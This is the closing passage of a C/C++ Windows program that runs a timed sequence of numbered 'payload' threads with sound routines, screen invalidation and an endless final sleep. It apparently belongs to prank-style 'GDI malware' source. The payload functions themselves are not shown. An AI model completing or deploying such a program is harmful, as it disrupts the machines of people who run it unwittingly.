            sound4();
            Sleep(25000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            sound6();
            Sleep(15000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            sound7();
            Sleep(25000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
            sound8();
            Sleep(25000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
            HANDLE thread9dot2 = CreateThread(0, 0, payload9dot2, 0, 0, 0);
            sound9();
            Sleep(20000);
            TerminateThread(thread9, 0);
            TerminateThread(thread9dot2, 0);
            CloseHandle(thread9);
            CloseHandle(thread9dot2);
            HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
            sound10();
            Sleep(25000);
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
            HANDLE thread13dot2 = CreateThread(0, 0, payload13dot2, 0, 0, 0);
            HANDLE thread13dot3 = CreateThread(0, 0, payload13dot3, 0, 0, 0);
            HANDLE thread13dot4 = CreateThread(0, 0, payload13dot4, 0, 0, 0);
            HANDLE thread13dot5 = CreateThread(0, 0, payload13dot5, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread13, 0);
            TerminateThread(thread13dot2, 0);
            TerminateThread(thread13dot3, 0);
            TerminateThread(thread13dot4, 0);
            TerminateThread(thread13dot5, 0);
            CloseHandle(thread13);
            CloseHandle(thread13dot2);
            CloseHandle(thread13dot3);
            CloseHandle(thread13dot4);
            CloseHandle(thread13dot5);
            HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
            Sleep(15000);
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
            Sleep(15000);
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            Sleep(-1);
        }
    }
}
